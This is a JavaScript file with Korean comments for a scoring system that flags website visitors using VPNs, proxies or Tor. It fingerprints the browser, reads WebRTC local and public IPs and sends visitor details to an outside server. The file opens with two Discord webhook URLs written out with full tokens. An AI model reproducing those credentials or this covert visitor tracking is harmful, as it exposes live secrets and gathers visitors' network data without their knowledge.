const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn';
const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1448713634111815691/aUP_IgLHFpoYGYvUZmxauDVGCWdj-7ZW7lDfhLgXkP9UeOFrR_N_3pramrO7jHHbaKsT';

let visitorInfo = {};

/* ========== VPN/프록시 탐지 ========== */

/**
 * VPN/프록시 감지 종합 분석 (강화 버전)
 * 클라이언트 + 서버 사이드 체크 통합
 */
/**
 * 🔥 VPN/프록시 탐지 시스템 - 대폭 강화 버전
 * 
 * 주요 개선사항:
 * 1. 가중치 기반 점수 시스템 (단순 합산 → 신뢰도 곱셈)
 * 2. 화이트리스트 기반 오탐지 제거
 * 3. 다중 증거 요구 (Single Point of Failure 제거)
 * 4. 시간 기반 행동 패턴 분석
 * 5. 머신러닝 스타일 특징 추출
 */

// ========== 설정 상수 ==========
const VPN_DETECTION_CONFIG = {
    // 의심도 임계값 (더 엄격하게 조정)
    THRESHOLDS: {
        CRITICAL: 75,      // 확실한 VPN/Tor (85 → 75)
        HIGH: 60,          // 매우 의심 (70 → 60)
        MEDIUM: 40,        // 의심 (50 → 40)
        LOW: 25            // 약간 의심 (30 → 25)
    },
    
    // 최소 증거 요구 (더 유연하게)
    MIN_EVIDENCE_COUNT: {
        CRITICAL: 2,  // 75점 이상이면 2개 증거로 충분 (3 → 2)
        HIGH: 2,
        MEDIUM: 1
    },
    
    // 가중치 (더 강하게 조정)
    WEIGHTS: {
        TOR_DETECTED: 1.0,              // 100% 신뢰
        KNOWN_VPN_SERVICE: 0.98,        // 98% 신뢰 (0.95 → 0.98)
        DATACENTER_ASN: 0.95,           // 95% 신뢰 (0.90 → 0.95)
        SERVER_IP_REPUTATION: 0.90,     // 90% 신뢰 (0.85 → 0.90)
        WEBRTC_IP_MISMATCH: 0.80,       // 80% 신뢰 (0.75 → 0.80)
        TIMEZONE_MISMATCH: 0.65,        // 65% 신뢰 (0.60 → 0.65)
        MULTIPLE_PROXY_HEADERS: 0.75,   // 75% 신뢰 (0.70 → 0.75)
        DNS_LEAK: 0.55,                 // 55% 신뢰 (0.50 → 0.55)
        BROWSER_ANOMALIES: 0.45,        // 45% 신뢰 (0.40 → 0.45)
        HIGH_LATENCY: 0.40              // 40% 신뢰 (0.35 → 0.40)
    },
    
    // 화이트리스트 (정상 사용자 보호)
    WHITELIST: {
        // 정상적인 기업 ASN (AWS, Google Cloud 등은 일반 사용자도 사용)
        LEGITIMATE_ASNS: [
            // 주요 ISP만 허용, 데이터센터는 제외
        ],
        // 정상적인 프록시 헤더 (기업망, CDN)
        LEGITIMATE_HEADERS: ['CF-Connecting-IP', 'X-Forwarded-For', 'X-Real-IP'],
        // IPv6 허용
        ALLOW_IPV6: true
    }
};

/**
 * 강화된 VPN 탐지 메인 함수
 */
async function detectVPNProxy(visitorInfo) {
    const detection = {
        // 최종 판단
        isVPN: false,
        isTor: false,
        isProxy: false,
        isDatacenter: false,
        
        // 점수 시스템
        score: 0,              // 가중치 적용된 최종 점수 (0-100)
        rawScore: 0,           // 가중치 없는 원점수
        confidence: 0,         // 신뢰도 (0-100)
        riskLevel: 'none',
        
        // 증거 목록
        evidence: [],          // { type, weight, score, description }
        evidenceCount: 0,
        
        // 상세 정보
        details: {
            client: {},
            server: {},
            behavioral: {},
            fingerprint: {}
        },
        
        // 메타데이터
        timestamp: new Date().toISOString(),
        detectionVersion: '2.0-enhanced'
    };

    try {
        // ========== Phase 1: 클라이언트 사이드 고신뢰도 체크 ==========
        
        // 1.1 Tor 탐지 (최우선, 100% 신뢰도)
        const torCheck = await checkTorNetworkEnhanced(visitorInfo);
        if (torCheck.detected) {
            addEvidence(detection, {
                type: 'TOR_DETECTED',
                weight: VPN_DETECTION_CONFIG.WEIGHTS.TOR_DETECTED,
                score: 100,
                description: `Tor 네트워크 감지: ${torCheck.method}`,
                critical: true
            });
            detection.isTor = true;
        }
        
        // 1.2 알려진 VPN 서비스 탐지
        const knownVpnCheck = await checkKnownVPNServicesEnhanced(visitorInfo);
        if (knownVpnCheck.detected) {
            addEvidence(detection, {
                type: 'KNOWN_VPN_SERVICE',
                weight: VPN_DETECTION_CONFIG.WEIGHTS.KNOWN_VPN_SERVICE,
                score: 95,
                description: `알려진 VPN 서비스: ${knownVpnCheck.service} (${knownVpnCheck.confidence}% 확신)`,
                critical: true
            });
            detection.isVPN = true;
        }
        
        // 1.3 WebRTC IP 분석 (다중 검증)
        const webrtcCheck = await analyzeWebRTCEnhanced(visitorInfo);
        if (webrtcCheck.suspicious) {
            addEvidence(detection, {
                type: 'WEBRTC_ANOMALY',
                weight: VPN_DETECTION_CONFIG.WEIGHTS.WEBRTC_IP_MISMATCH,
                score: webrtcCheck.score,
                description: webrtcCheck.description
            });
            if (webrtcCheck.score > 80) {
                detection.isProxy = true;
            }
        }
        
        // ========== Phase 2: 서버 사이드 고신뢰도 체크 ==========
        
        const serverCheck = await requestServerSideCheckEnhanced(visitorInfo);
        if (serverCheck && !serverCheck.error) {
            detection.details.server = serverCheck;
            
            // 2.1 IP 평판 (외부 API) - 점수 대폭 상향
            if (serverCheck.ipReputation) {
                const rep = serverCheck.ipReputation;
                if (rep.isVPN || rep.isTor || rep.isProxy) {
                    addEvidence(detection, {
                        type: 'SERVER_IP_REPUTATION',
                        weight: VPN_DETECTION_CONFIG.WEIGHTS.SERVER_IP_REPUTATION,
                        score: rep.confidenceScore || 95,  // 85 → 95로 상향
                        description: `IP 평판 DB 매칭: ${rep.sources.join(', ')}`,
                        critical: true
                    });
                    if (rep.isVPN) detection.isVPN = true;
                    if (rep.isTor) detection.isTor = true;
                    if (rep.isProxy) detection.isProxy = true;
                }
            }
            
            // 2.2 데이터센터/호스팅 ASN - 점수 상향
            if (serverCheck.advancedDetection?.isHosting) {
                // 화이트리스트 체크
                const isLegitimate = isLegitimateHosting(serverCheck.advancedDetection.asn);
                if (!isLegitimate) {
                    addEvidence(detection, {
                        type: 'DATACENTER_ASN',
                        weight: VPN_DETECTION_CONFIG.WEIGHTS.DATACENTER_ASN,
                        score: 90,  // 80 → 90으로 상향
                        description: `데이터센터/호스팅 감지: ${serverCheck.advancedDetection.asn}`
                    });
                    detection.isDatacenter = true;
                }
            }
            
            // 2.3 프록시 헤더 분석 (화이트리스트 적용)
            if (serverCheck.headers?.detectedHeaders) {
                const suspiciousHeaders = filterSuspiciousHeaders(
                    serverCheck.headers.detectedHeaders
                );
                if (suspiciousHeaders.length > 0) {
                    addEvidence(detection, {
                        type: 'SUSPICIOUS_HEADERS',
                        weight: VPN_DETECTION_CONFIG.WEIGHTS.MULTIPLE_PROXY_HEADERS,
                        score: Math.min(suspiciousHeaders.length * 20, 70),
                        description: `의심스러운 프록시 헤더: ${suspiciousHeaders.map(h => h.name).join(', ')}`
                    });
                }
            }
        }
        
        // ========== Phase 3: 중신뢰도 체크 (보조 증거) ==========
        
        // 3.1 타임존 일관성 (개선됨)
        const timezoneCheck = await checkTimezoneConsistencyEnhanced(visitorInfo);
        if (timezoneCheck.inconsistent && timezoneCheck.confidence > 60) {
            addEvidence(detection, {
                type: 'TIMEZONE_MISMATCH',
                weight: VPN_DETECTION_CONFIG.WEIGHTS.TIMEZONE_MISMATCH,
                score: timezoneCheck.score,
                description: timezoneCheck.description
            });
        }
        
        // 3.2 DNS 누출 체크
        const dnsCheck = await checkDNSLeakEnhanced(visitorInfo);
        if (dnsCheck.leaked && dnsCheck.confidence > 50) {
            addEvidence(detection, {
                type: 'DNS_LEAK',
                weight: VPN_DETECTION_CONFIG.WEIGHTS.DNS_LEAK,
                score: dnsCheck.score,
                description: dnsCheck.description
            });
        }
        
        // 3.3 브라우저 핑거프린트 이상
        const browserCheck = await analyzeBrowserFingerprintEnhanced(visitorInfo);
        if (browserCheck.anomalous && browserCheck.confidence > 40) {
            addEvidence(detection, {
                type: 'BROWSER_ANOMALIES',
                weight: VPN_DETECTION_CONFIG.WEIGHTS.BROWSER_ANOMALIES,
                score: browserCheck.score,
                description: browserCheck.description
            });
        }
        
        // 3.4 네트워크 지연/지터 분석
        const latencyCheck = await measureNetworkLatencyEnhanced(visitorInfo);
        if (latencyCheck.suspicious && latencyCheck.confidence > 35) {
            addEvidence(detection, {
                type: 'HIGH_LATENCY',
                weight: VPN_DETECTION_CONFIG.WEIGHTS.HIGH_LATENCY,
                score: latencyCheck.score,
                description: latencyCheck.description
            });
        }
        
        // ========== Phase 4: 행동 패턴 분석 (새로 추가) ==========
        
        // 4.1 마우스/키보드 패턴 (봇 탐지)
        const behaviorCheck = await analyzeBehavioralPatterns();
        if (behaviorCheck.suspicious) {
            addEvidence(detection, {
                type: 'BEHAVIORAL_ANOMALY',
                weight: 0.30,
                score: behaviorCheck.score,
                description: behaviorCheck.description
            });
        }
        
        // 4.2 연결 일관성 체크 (재방문자)
        const consistencyCheck = await checkConnectionConsistency(visitorInfo);
        if (consistencyCheck.inconsistent) {
            addEvidence(detection, {
                type: 'CONNECTION_INCONSISTENCY',
                weight: 0.45,
                score: consistencyCheck.score,
                description: consistencyCheck.description
            });
        }
        
        // ========== Phase 5: 머신러닝 스타일 특징 추출 ==========
        
        const features = extractAdvancedFeatures(visitorInfo, detection);
        detection.details.fingerprint = features;
        
        // ========== Phase 6: 최종 판단 및 신뢰도 계산 ==========
        
        calculateFinalScore(detection);
        
        // 최소 증거 요구 체크 (오탐지 방지)
        const meetsMinimumEvidence = validateMinimumEvidence(detection);
        if (!meetsMinimumEvidence) {
            // 점수는 높지만 증거가 부족한 경우 레벨 다운
            if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.CRITICAL) {
                detection.riskLevel = 'high';
                detection.confidence = Math.max(detection.confidence - 20, 0);
            } else if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.HIGH) {
                detection.riskLevel = 'medium';
                detection.confidence = Math.max(detection.confidence - 15, 0);
            }
        }
        
        // 치명적 증거가 있으면 무조건 VPN 판정
        const hasCriticalEvidence = detection.evidence.some(e => e.critical);
        if (hasCriticalEvidence) {
            detection.isVPN = true;
            detection.confidence = Math.max(detection.confidence, 94);
        }

        // 가중치 기반 최종 의심도(0-100) 산출 및 이유 목록 생성
        detection.suspicionLevel = Math.round(Math.min(Math.max(detection.score, 0), 100));
        detection.reasons = detection.evidence.map((e, idx) => `[#${idx + 1}] ${e.description || e.type}`);

        // 증거가 있고 점수가 중간 이상이면 VPN 확정
        if (!detection.isVPN && detection.evidenceCount > 0 && detection.suspicionLevel >= VPN_DETECTION_CONFIG.THRESHOLDS.MEDIUM) {
            detection.isVPN = true;
        }

        // 증거가 전무하고 점수가 매우 낮으면 확실히 정상으로 판정
        if (detection.evidenceCount === 0 && detection.suspicionLevel < VPN_DETECTION_CONFIG.THRESHOLDS.LOW) {
            detection.isVPN = false;
            detection.isProxy = false;
            detection.isTor = false;
            detection.isDatacenter = false;
            detection.riskLevel = 'none';
            detection.confidence = Math.max(detection.confidence, 96);
            detection.reasons = ['정상 연결로 판단 (의심 증거 없음)'];
        }
        
    } catch (error) {
        console.error('Enhanced VPN detection error:', error);
        detection.error = error.message;
    }
    
    return detection;
}

/**
 * 증거 추가 (가중치 적용)
 */
function addEvidence(detection, evidence) {
    detection.evidence.push(evidence);
    detection.evidenceCount++;
    
    // 가중치 적용한 점수 계산
    const weightedScore = evidence.score * evidence.weight;
    detection.rawScore += evidence.score;
    detection.score += weightedScore;
}

/**
 * 최종 점수 및 신뢰도 계산
 */
function calculateFinalScore(detection) {
    // 점수 정규화 (0-100)
    detection.score = Math.min(detection.score, 100);
    
    // 신뢰도 계산 (증거 개수, 가중치 평균 고려)
    const avgWeight = detection.evidence.reduce((sum, e) => sum + e.weight, 0) / 
                      Math.max(detection.evidence.length, 1);
    const evidenceBonus = Math.min(detection.evidenceCount * 5, 30);
    
    detection.confidence = Math.min(
        (detection.score * 0.6) + (avgWeight * 30) + evidenceBonus,
        100
    );
    
    // 위험 레벨 판정
    if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.CRITICAL) {
        detection.riskLevel = 'critical';
    } else if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.HIGH) {
        detection.riskLevel = 'high';
    } else if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.MEDIUM) {
        detection.riskLevel = 'medium';
    } else if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.LOW) {
        detection.riskLevel = 'low';
    } else {
        detection.riskLevel = 'none';
    }
}

/**
 * 최소 증거 요구 검증
 */
function validateMinimumEvidence(detection) {
    const config = VPN_DETECTION_CONFIG.MIN_EVIDENCE_COUNT;
    
    if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.CRITICAL) {
        return detection.evidenceCount >= config.CRITICAL;
    } else if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.HIGH) {
        return detection.evidenceCount >= config.HIGH;
    } else if (detection.score >= VPN_DETECTION_CONFIG.THRESHOLDS.MEDIUM) {
        return detection.evidenceCount >= config.MEDIUM;
    }
    return true;
}

/**
 * 의심스러운 헤더 필터링 (화이트리스트 적용)
 */
function filterSuspiciousHeaders(headers) {
    const whitelist = VPN_DETECTION_CONFIG.WHITELIST.LEGITIMATE_HEADERS;
    return headers.filter(h => !whitelist.includes(h.name));
}

/**
 * 정상적인 호스팅 서비스 여부 판단
 */
function isLegitimateHosting(asn) {
    // 일반 사용자가 사용할 수 있는 ISP는 허용
    // 예: 가정용 인터넷, 모바일 네트워크
    const legitimatePatterns = [
        /telecom/i,
        /broadband/i,
        /mobile/i,
        /wireless/i,
        /cable/i,
        /fiber/i
    ];
    
    return legitimatePatterns.some(pattern => pattern.test(asn));
}

/**
 * ========== 강화된 개별 체크 함수들 ==========
 */

/**
 * Tor 탐지 - 다중 방법
 */
async function checkTorNetworkEnhanced(visitorInfo) {
    const result = { detected: false, method: null, confidence: 0 };
    
    // 방법 1: ISP/조직명
    const isp = (visitorInfo.location?.isp || '').toLowerCase();
    const org = (visitorInfo.location?.org || '').toLowerCase();
    
    const torKeywords = ['tor', 'exit node', 'exit relay', 'onion'];
    for (const keyword of torKeywords) {
        if (isp.includes(keyword) || org.includes(keyword)) {
            result.detected = true;
            result.method = 'ISP/Org name';
            result.confidence = 95;
            return result;
        }
    }
    
    // 방법 2: 서버에서 Cloudflare Tor 헤더 감지됨
    if (visitorInfo.vpnDetection?.details?.server?.cloudflare?.isTor) {
        result.detected = true;
        result.method = 'Cloudflare Tor header';
        result.confidence = 100;
        return result;
    }
    
    // 방법 3: 특정 포트 사용 패턴 (Tor는 특정 포트 사용)
    // 브라우저에서는 불가능, 서버 사이드만 가능
    
    return result;
}

/**
 * 알려진 VPN 서비스 탐지 - 확장된 DB
 */
async function checkKnownVPNServicesEnhanced(visitorInfo) {
    const result = { detected: false, service: null, confidence: 0, type: null };
    
    const isp = (visitorInfo.location?.isp || '').toLowerCase();
    const org = (visitorInfo.location?.org || '').toLowerCase();
    const combined = `${isp} ${org}`;
    
    // 확장된 VPN 서비스 DB (신뢰도 포함)
    const vpnServices = [
        // Tier 1: 유명 VPN (99% 확신)
        { keywords: ['nordvpn', 'nord vpn'], confidence: 99, name: 'NordVPN' },
        { keywords: ['expressvpn', 'express vpn'], confidence: 99, name: 'ExpressVPN' },
        { keywords: ['surfshark'], confidence: 99, name: 'Surfshark' },
        { keywords: ['protonvpn', 'proton vpn'], confidence: 99, name: 'ProtonVPN' },
        { keywords: ['cyberghost'], confidence: 99, name: 'CyberGhost' },
        { keywords: ['private internet access', 'pia vpn'], confidence: 99, name: 'PIA' },
        
        // Tier 2: 중급 VPN (95% 확신)
        { keywords: ['mullvad'], confidence: 95, name: 'Mullvad' },
        { keywords: ['windscribe'], confidence: 95, name: 'Windscribe' },
        { keywords: ['tunnelbear'], confidence: 95, name: 'TunnelBear' },
        { keywords: ['vyprvpn', 'vypr vpn'], confidence: 95, name: 'VyprVPN' },
        { keywords: ['hide.me', 'hideme'], confidence: 95, name: 'Hide.me' },
        
        // Tier 3: 일반 VPN 키워드 (85% 확신)
        { keywords: ['vpn service', 'vpn provider'], confidence: 85, name: 'Generic VPN' },
        { keywords: ['proxy service'], confidence: 80, name: 'Proxy Service' },
        
        // 데이터센터 (주거용 IP가 아닌 경우만)
        { keywords: ['datacenter', 'hosting'], confidence: 75, name: 'Datacenter', type: 'hosting' }
    ];
    
    for (const service of vpnServices) {
        for (const keyword of service.keywords) {
            if (combined.includes(keyword)) {
                result.detected = true;
                result.service = service.name;
                result.confidence = service.confidence;
                result.type = service.type || 'vpn';
                return result;
            }
        }
    }
    
    return result;
}

/**
 * WebRTC 분석 - 다중 검증
 */
async function analyzeWebRTCEnhanced(visitorInfo) {
    const result = { suspicious: false, score: 0, description: '', checks: [] };
    
    const webrtc = visitorInfo.webRTC || {};
    const publicIP = visitorInfo.ip;
    
    // 체크 1: WebRTC 완전 차단 (의심도 중간)
    if (webrtc.blocked === 'Yes') {
        result.checks.push({
            name: 'WebRTC blocked',
            suspicious: true,
            score: 30,
            note: '정상 사용자도 차단 가능 (프라이버시 설정)'
        });
    }
    
    // 체크 2: 공인 IP 불일치 (의심도 높음)
    if (webrtc.candidateIPs && webrtc.candidateIPs.length > 0 && publicIP) {
        const webrtcIP = webrtc.candidateIPs[0];
        if (webrtcIP !== publicIP) {
            // IPv6 vs IPv4 불일치는 정상일 수 있음
            const isIPv4Mismatch = !webrtcIP.includes(':') && !publicIP.includes(':');
            const isIPv6Mismatch = webrtcIP.includes(':') && publicIP.includes(':');
            
            if (isIPv4Mismatch || isIPv6Mismatch) {
                result.checks.push({
                    name: 'Public IP mismatch',
                    suspicious: true,
                    score: 75,
                    note: `WebRTC: ${webrtcIP}, Public: ${publicIP}`
                });
            }
        }
    }
    
    // 체크 3: 다중 공인 IP (프록시 체인)
    if (webrtc.candidateIPs && webrtc.candidateIPs.length > 2) {
        result.checks.push({
            name: 'Multiple public IPs',
            suspicious: true,
            score: 60,
            note: `${webrtc.candidateIPs.length}개의 공인 IP 후보`
        });
    }
    
    // 체크 4: 로컬 IP 이상 (다중 네트워크 인터페이스)
    if (webrtc.localIPs && webrtc.localIPs.length > 4) {
        result.checks.push({
            name: 'Excessive local IPs',
            suspicious: true,
            score: 20,
            note: `${webrtc.localIPs.length}개의 로컬 IP (VM/VPN 의심)`
        });
    }
    
    // 최종 판단
    result.suspicious = result.checks.some(c => c.suspicious);
    result.score = Math.max(...result.checks.map(c => c.score || 0));
    result.description = result.checks.filter(c => c.suspicious)
                                      .map(c => c.name).join(', ') || 'Normal';
    
    return result;
}

/**
 * 타임존 일관성 - 개선된 로직
 */
async function checkTimezoneConsistencyEnhanced(visitorInfo) {
    const result = { inconsistent: false, score: 0, confidence: 0, description: '' };
    
    const browserTz = visitorInfo.timezoneInfo?.timezone;
    const locationTz = visitorInfo.location?.timezone;
    const ipCountry = visitorInfo.location?.countryCode;
    const browserLang = visitorInfo.device?.language;
    
    let inconsistencyCount = 0;
    const checks = [];
    
    // 체크 1: 타임존 직접 비교
    if (browserTz && locationTz && browserTz !== locationTz) {
        // 같은 국가 내 타임존 차이는 정상
        const sameCountry = browserTz.startsWith(ipCountry) || locationTz.startsWith(ipCountry);
        if (!sameCountry) {
            inconsistencyCount++;
            checks.push(`타임존: ${browserTz} ≠ ${locationTz}`);
        }
    }
    
    // 체크 2: 언어와 국가 불일치
    if (browserLang && ipCountry) {
        const langCountry = browserLang.split('-')[1]?.toUpperCase();
        // US/GB 영어권은 제외
        if (langCountry && langCountry !== ipCountry && 
            !['US', 'GB', 'EN'].includes(langCountry) && 
            !['US', 'GB'].includes(ipCountry)) {
            inconsistencyCount++;
            checks.push(`언어: ${browserLang} ↔ 국가: ${ipCountry}`);
        }
    }
    
    // 체크 3: 타임존 오프셋 vs IP 위치 오프셋
    const browserOffset = visitorInfo.timezoneInfo?.timezoneOffset;
    // IP 기반 타임존 오프셋 계산은 복잡하므로 생략
    
    result.inconsistent = inconsistencyCount > 0;
    result.score = Math.min(inconsistencyCount * 40, 70);
    result.confidence = inconsistencyCount > 1 ? 75 : 50;
    result.description = checks.join(' | ') || 'Consistent';
    
    return result;
}

/**
 * DNS 누출 체크 - 개선
 */
async function checkDNSLeakEnhanced(visitorInfo) {
    const result = { leaked: false, score: 0, confidence: 0, description: '' };
    
    // 브라우저에서는 직접 DNS 조회 불가
    // 간접적 추론: 타임존-국가 불일치
    const browserTz = visitorInfo.timezoneInfo?.timezone;
    const ipCountry = visitorInfo.location?.countryCode;
    
    const timezoneCountryMap = {
        'Asia/Seoul': 'KR',
        'America/New_York': 'US',
        'America/Los_Angeles': 'US',
        'Europe/London': 'GB',
        'Europe/Paris': 'FR',
        'Asia/Tokyo': 'JP',
        'Asia/Shanghai': 'CN',
        'Asia/Hong_Kong': 'HK',
        'Australia/Sydney': 'AU'
    };
    
    const expectedCountry = timezoneCountryMap[browserTz];
    if (expectedCountry && ipCountry && expectedCountry !== ipCountry) {
        result.leaked = true;
        result.score = 50;
        result.confidence = 60;
        result.description = `예상 국가: ${expectedCountry}, 실제: ${ipCountry}`;
    }
    
    return result;
}

/**
 * 브라우저 핑거프린트 이상 탐지 - 확장
 */
async function analyzeBrowserFingerprintEnhanced(visitorInfo) {
    const result = { anomalous: false, score: 0, confidence: 0, description: '', checks: [] };
    
    // 체크 1: 플러그인 수 이상
    const plugins = visitorInfo.plugins;
    const pluginCount = plugins === 'N/A' ? 0 : (plugins.match(/,/g) || []).length + 1;
    const isMobile = /Mobile|Android|iPhone/.test(visitorInfo.device?.userAgent || '');
    
    if (pluginCount === 0 && !isMobile) {
        result.checks.push({ name: 'No plugins', score: 15 });
    }
    
    // 체크 2: WebGL 정보 누락
    const webgl = visitorInfo.webgl;
    if (webgl && (webgl.vendor === 'N/A' || webgl.renderer === 'N/A')) {
        result.checks.push({ name: 'WebGL blocked', score: 12 });
    }
    
    // 체크 3: Canvas 핑거프린트 무작위화
    // (실제 구현은 복잡, 여기서는 간단히)
    
    // 체크 4: 언어 설정 이상
    const languages = visitorInfo.device?.languages;
    if (languages && languages === 'en-US') {
        result.checks.push({ name: 'Single language (en-US)', score: 5 });
    }
    
    // 체크 5: 화면 크기가 일반적이지 않음
    const screen = visitorInfo.screen;
    if (screen && (screen.screenWidth === 800 && screen.screenHeight === 600)) {
        result.checks.push({ name: 'VM screen size', score: 15 });
    }
    
    result.anomalous = result.checks.length > 2;
    result.score = result.checks.reduce((sum, c) => sum + c.score, 0);
    result.confidence = Math.min(result.checks.length * 15, 60);
    result.description = result.checks.map(c => c.name).join(', ') || 'Normal';
    
    return result;
}

/**
 * 네트워크 지연 측정 - 개선
 */
async function measureNetworkLatencyEnhanced(visitorInfo) {
    const result = { suspicious: false, score: 0, confidence: 0, description: '' };
    
    // WebRTC 지연은 이미 측정됨
    const webrtcLatency = visitorInfo.vpnDetection?.details?.client?.webrtcLatency;
    
    if (webrtcLatency && webrtcLatency.latency > 1500) {
        result.suspicious = true;
        result.score = 20;
        result.confidence = 40;
        result.description = `WebRTC 지연: ${webrtcLatency.latency}ms`;
    }
    
    // 추가: HTTP 요청 지연 측정
    // (api/vpn-check 응답 시간 등)
    
    return result;
}

/**
 * ========== 새로운 고급 기능 ==========
 */

/**
 * 행동 패턴 분석 (봇 탐지)
 */
async function analyzeBehavioralPatterns() {
    const result = { suspicious: false, score: 0, description: '' };
    
    // 마우스 움직임 패턴 추적
    const mouseData = window.behavioralData?.mouse || {};
    
    // 체크 1: 마우스 움직임이 전혀 없음
    if (mouseData.moveCount === 0 && Date.now() - window.pageLoadTime > 5000) {
        result.suspicious = true;
        result.score += 15;
        result.description = '마우스 움직임 없음 (봇 의심)';
    }
    
    // 체크 2: 마우스 움직임이 너무 정확함 (직선 이동)
    if (mouseData.entropy && mouseData.entropy < 0.3) {
        result.suspicious = true;
        result.score += 20;
        result.description += ', 비자연스러운 마우스 패턴';
    }
    
    // 체크 3: 페이지 로드 후 즉시 액션
    if (window.firstInteractionTime && window.firstInteractionTime < 100) {
        result.suspicious = true;
        result.score += 10;
        result.description += ', 즉시 상호작용 (스크립트 의심)';
    }
    
    return result;
}

/**
 * 연결 일관성 체크 (재방문자)
 */
async function checkConnectionConsistency(visitorInfo) {
    const result = { inconsistent: false, score: 0, description: '' };
    
    // localStorage에 이전 방문 정보 저장
    try {
        const prevVisit = JSON.parse(localStorage.getItem('vpn_prev_visit') || '{}');
        
        if (prevVisit.ip) {
            // IP가 완전히 바뀜 (같은 세션 내)
            if (prevVisit.ip !== visitorInfo.ip) {
                const timeDiff = Date.now() - (prevVisit.timestamp || 0);
                // 짧은 시간 내 IP 변경은 의심스러움
                if (timeDiff < 3600000) { // 1시간
                    result.inconsistent = true;
                    result.score = 40;
                    result.description = '짧은 시간 내 IP 변경';
                }
            }
            
            // 국가가 바뀜
            if (prevVisit.country !== visitorInfo.location?.countryCode) {
                result.inconsistent = true;
                result.score += 30;
                result.description += ', 국가 변경';
            }
        }
        
        // 현재 방문 정보 저장
        localStorage.setItem('vpn_prev_visit', JSON.stringify({
            ip: visitorInfo.ip,
            country: visitorInfo.location?.countryCode,
            timestamp: Date.now()
        }));
        
    } catch {}
    
    return result;
}

/**
 * 고급 특징 추출 (머신러닝 스타일)
 */
function extractAdvancedFeatures(visitorInfo, detection) {
    return {
        // 네트워크 특징
        network: {
            ipType: visitorInfo.ipVersion,
            hasIPv6: !!visitorInfo.ipInfo?.ipv6,
            connectionType: visitorInfo.network?.networkCategory,
            effectiveType: visitorInfo.network?.effectiveType
        },
        
        // 브라우저 특징
        browser: {
            name: visitorInfo.browser?.browserName,
            pluginCount: (visitorInfo.plugins || '').split(',').length,
            hasWebGL: visitorInfo.webgl?.vendor !== 'N/A',
            languageCount: (visitorInfo.device?.languages || '').split(',').length
        },
        
        // 위치 특징
        location: {
            country: visitorInfo.location?.countryCode,
            isp: visitorInfo.location?.isp,
            org: visitorInfo.location?.org,
            timezone: visitorInfo.timezoneInfo?.timezone
        },
        
        // VPN 시그니처
        vpnSignature: {
            evidenceCount: detection.evidenceCount,
            criticalEvidence: detection.evidence.filter(e => e.critical).length,
            highConfidenceChecks: detection.evidence.filter(e => e.weight > 0.7).length
        }
    };
}

/**
 * 서버 사이드 체크 요청 (에러 핸들링 강화)
 */
async function requestServerSideCheckEnhanced(visitorInfo) {
    try {
        const response = await fetch('https://teralink.store/api/vpn-check', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ip: visitorInfo.ip,
                location: visitorInfo.location,
                device: visitorInfo.device,
                browser: visitorInfo.browser,
                timezone: visitorInfo.timezoneInfo,
                webrtc: visitorInfo.webRTC
            }),
            // 타임아웃 설정
            signal: AbortSignal.timeout(10000) // 10초
        });
        
        if (!response.ok) {
            throw new Error(`Server check failed: ${response.status}`);
        }
        
        return await response.json();
    } catch (error) {
        console.warn('Server-side VPN check failed:', error);
        // 서버 체크 실패해도 클라이언트 체크로 계속 진행
        return { error: error.message };
    }
}

// ========== 행동 패턴 추적 초기화 ==========
window.behavioralData = { mouse: { moveCount: 0, entropy: 0 } };
window.pageLoadTime = Date.now();

document.addEventListener('mousemove', (e) => {
    window.behavioralData.mouse.moveCount++;
    // 엔트로피 계산 (간단 버전)
    // 실제로는 더 복잡한 알고리즘 필요
});

document.addEventListener('click', () => {
    if (!window.firstInteractionTime) {
        window.firstInteractionTime = Date.now() - window.pageLoadTime;
    }
});


/**
 * 서버 사이드 체크 요청
 */
async function requestServerSideCheck(clientData) {
    try {
        const response = await fetch('https://teralink.store/api/vpn-check', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(clientData)
        });

        if (!response.ok) {
            throw new Error(`Server check failed: ${response.status}`);
        }

        return await response.json();
    } catch (error) {
        console.warn('Server-side VPN check failed:', error);
        return { error: error.message };
    }
}

/**
 * 브라우저 이상 징후 탐지
 */
function detectBrowserAnomalies() {
    const result = {
        suspicious: false,
        points: 0,
        reasons: [],
        anomalies: []
    };

    // 1. 플러그인 수 체크 (VPN 브라우저는 플러그인이 적을 수 있음)
    const pluginCount = navigator.plugins.length;
    if (pluginCount === 0) {
        result.points += 15;
        result.reasons.push('플러그인이 전혀 없음 (헤드리스 브라우저 의심)');
        result.anomalies.push('no-plugins');
        result.suspicious = true;
    } else if (pluginCount < 3 && !navigator.userAgent.includes('Mobile')) {
        result.points += 8;
        result.reasons.push('비정상적으로 적은 플러그인 수');
        result.anomalies.push('few-plugins');
        result.suspicious = true;
    }

    // 2. Canvas 일관성 체크
    try {
        const canvas1 = getCanvasFingerprint();
        const canvas2 = getCanvasFingerprint();
        if (canvas1 !== canvas2) {
            result.points += 25;
            result.reasons.push('Canvas 핑거프린트 불일치 (스푸핑 의심)');
            result.anomalies.push('canvas-spoofing');
            result.suspicious = true;
        }
    } catch (error) {
        result.points += 10;
        result.reasons.push('Canvas API 오류');
    }

    // 3. WebGL 벤더 체크
    const webgl = visitorInfo.webgl;
    if (webgl && (webgl.vendor === 'N/A' || webgl.renderer === 'N/A')) {
        result.points += 12;
        result.reasons.push('WebGL 정보 누락 (차단/스푸핑 의심)');
        result.anomalies.push('webgl-blocked');
        result.suspicious = true;
    }

    // 4. 언어 불일치
    const languages = navigator.languages || [navigator.language];
    if (languages.length === 1 && languages[0] === 'en-US') {
        result.points += 5;
        result.reasons.push('단일 언어 설정 (en-US only)');
        result.anomalies.push('single-language');
    }

    // 5. 화면 크기 이상
    if (screen.width === screen.availWidth && screen.height === screen.availHeight) {
        // 전체화면 모드이거나 VM
        if (screen.width === 800 && screen.height === 600) {
            result.points += 15;
